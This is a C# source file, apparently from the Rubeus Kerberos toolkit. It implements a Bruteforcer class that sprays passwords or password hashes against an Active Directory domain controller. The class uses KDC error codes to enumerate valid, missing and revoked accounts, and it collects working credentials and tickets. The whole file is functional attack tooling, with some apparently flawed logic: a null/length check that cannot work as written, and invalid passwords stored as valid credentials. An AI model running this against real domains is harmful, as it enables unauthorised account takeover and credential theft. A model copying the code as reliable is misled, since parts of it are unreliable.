using System;
using System.Collections.Generic;
using Rubeus.Commands;

namespace Rubeus
{

    public interface IBruteforcerReporter
    {
        void ReportValidPassword(string domain, string username, string password, byte[] ticket, Interop.KERBEROS_ERROR err = Interop.KERBEROS_ERROR.KDC_ERR_NONE);
        void ReportValidUser(string domain, string username);
        void ReportInvalidUser(string domain, string username);
        void ReportBlockedUser(string domain, string username);
        void ReportKrbError(string domain, string username, KRB_ERROR krbError);
        void ReportInvalidPassword(string domain, string username, string password, string hash);
    }


    public class Bruteforcer
    {

        private string domain;
        private string dc;
        private IBruteforcerReporter reporter;
        private Dictionary<string, bool> invalidUsers;
        private Dictionary<string, bool> validUsers;
        private Dictionary<string, string> validCredentials;

        public Bruteforcer(string domain, string domainController, IBruteforcerReporter reporter)
        {
            this.domain = domain;
            this.dc = domainController;
            this.reporter = reporter;
            this.invalidUsers = new Dictionary<string, bool>();
            this.validUsers = new Dictionary<string, bool>();
            this.validCredentials = new Dictionary<string, string>();
        }

        public bool Attack(string[] usernames, string[] passwords, string hash, bool hashspray, Interop.KERB_ETYPE enctype)
        {
            bool success = false;
            if (hashspray)
            {
                foreach (string username in usernames)
                {
                    if (this.TestUsernamePassword(username, "", hash, hashspray, enctype))
                    {
                        success = true;
                    }
                }
            }
            else
            {
                foreach (string password in passwords)
                {
                    foreach (string username in usernames)
                    {
                        if (this.TestUsernamePassword(username, password, hash, hashspray, enctype))
                        {
                            success = true;
                        }
                    }
                }
            }
            return success;
        }

        private bool TestUsernamePassword(string username, string password, string hash, bool hashspray, Interop.KERB_ETYPE enctype)
        {
            try
            {
                if (!invalidUsers.ContainsKey(username) && !validCredentials.ContainsKey(username))
                {
                    this.GetUsernamePasswordTGT(username, password, hash, hashspray, enctype);
                    return true;
                }
            }
            catch (KerberosErrorException ex)
            {
                return this.HandleKerberosError(ex, username, password);
            }

            return false;
        }

        private void GetUsernamePasswordTGT(string username, string password, string pwhash, bool hashspray, Interop.KERB_ETYPE etype)
        {
            Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.rc4_hmac;
            string hash = "";
            if (hashspray)
            {
                encType = etype;
                hash = pwhash;
            }
            else
            {
                string salt = String.Format("{0}{1}", domain.ToUpper(), username);
                // special case for computer account salts
                if (username.EndsWith("$"))
                {
                    salt = String.Format("{0}host{1}.{2}", domain.ToUpper(), username.TrimEnd('$').ToLower(), domain.ToLower());
                }

                hash = Crypto.KerberosPasswordHash(encType, password, salt);
            }

            try
            {
                AS_REQ unpwAsReq = AS_REQ.NewASReq(username, domain, hash, encType);

                byte[] TGT = Ask.InnerTGT(unpwAsReq, encType, null, false, this.dc);
                if (TGT != null || TGT.Length == 0)
                {
                    password = hash;
                    this.ReportValidPassword(username, password, TGT);
                }
            }
            catch (KerberosErrorException kex)
            {
                KRB_ERROR error = kex.krbError;

                //Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}: {2}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code, error.e_text);
                // KDC_ERR_PREAUTH_FAILED = incorrect password, Assumed all usernames are correct and preauth enabled.
                if (error.error_code == 24)
                {
                    this.ReportInvalidPassword(username, password, hash);
                }

                if (error.e_data[0].type == Interop.PADATA_TYPE.SUPERSEDED_BY_USER)
                {
                    PA_SUPERSEDED_BY_USER obj = (PA_SUPERSEDED_BY_USER)error.e_data[0].value;
                    Console.WriteLine("[*] {0} is superseded by {1}", username, obj.name.name_string[0]);
                }


            }
        }

        private bool HandleKerberosError(KerberosErrorException ex, string username, string password)
        {


            KRB_ERROR krbError = ex.krbError;
            bool ret = false;

            switch ((Interop.KERBEROS_ERROR)krbError.error_code)
            {
                case Interop.KERBEROS_ERROR.KDC_ERR_PREAUTH_FAILED:
                    this.ReportValidUser(username);
                    break;
                case Interop.KERBEROS_ERROR.KDC_ERR_C_PRINCIPAL_UNKNOWN:
                    this.ReportInvalidUser(username);
                    break;
                case Interop.KERBEROS_ERROR.KDC_ERR_CLIENT_REVOKED:
                    this.ReportBlockedUser(username);
                    break;
                case Interop.KERBEROS_ERROR.KDC_ERR_ETYPE_NOTSUPP:
                    this.ReportInvalidEncryptionType(username, krbError);
                    break;
                case Interop.KERBEROS_ERROR.KDC_ERR_KEY_EXPIRED:
                    this.ReportValidPassword(username, password, null, (Interop.KERBEROS_ERROR)krbError.error_code);
                    ret = true;
                    break;
                default:
                    this.ReportKrbError(username, krbError);
                    throw ex;
            }
            return ret;
        }

        private void ReportValidPassword(string username, string password, byte[] ticket, Interop.KERBEROS_ERROR err = Interop.KERBEROS_ERROR.KDC_ERR_NONE)
        {

            validCredentials.Add(username, password);
            if (!validUsers.ContainsKey(username))
            {
                validUsers.Add(username, true);
            }
            this.reporter.ReportValidPassword(this.domain, username, password, ticket, err);
        }

        private void ReportValidUser(string username)
        {
            if (!validUsers.ContainsKey(username))
            {
                validUsers.Add(username, true);
                this.reporter.ReportValidUser(this.domain, username);
            }
        }

        private void ReportInvalidUser(string username)
        {
            if (!invalidUsers.ContainsKey(username))
            {
                invalidUsers.Add(username, true);
                this.reporter.ReportInvalidUser(this.domain, username);
            }
        }

        private void ReportBlockedUser(string username)
        {
            if (!invalidUsers.ContainsKey(username))
            {
                invalidUsers.Add(username, true);
                this.reporter.ReportBlockedUser(this.domain, username);
            }
        }

        private void ReportInvalidEncryptionType(string username, KRB_ERROR krbError)
        {
            if (!invalidUsers.ContainsKey(username))
            {
                invalidUsers.Add(username, true);
                this.ReportKrbError(username, krbError);
            }
        }

        private void ReportKrbError(string username, KRB_ERROR krbError)
        {
            this.reporter.ReportKrbError(this.domain, username, krbError);
        }

        private void ReportInvalidPassword(string username, string password, string hash)
        {

            validCredentials.Add(username, password);
            if (!validUsers.ContainsKey(username))
            {
                validUsers.Add(username, true);
            }
            this.reporter.ReportInvalidPassword(this.domain, username, password, hash);
        }

    }
}
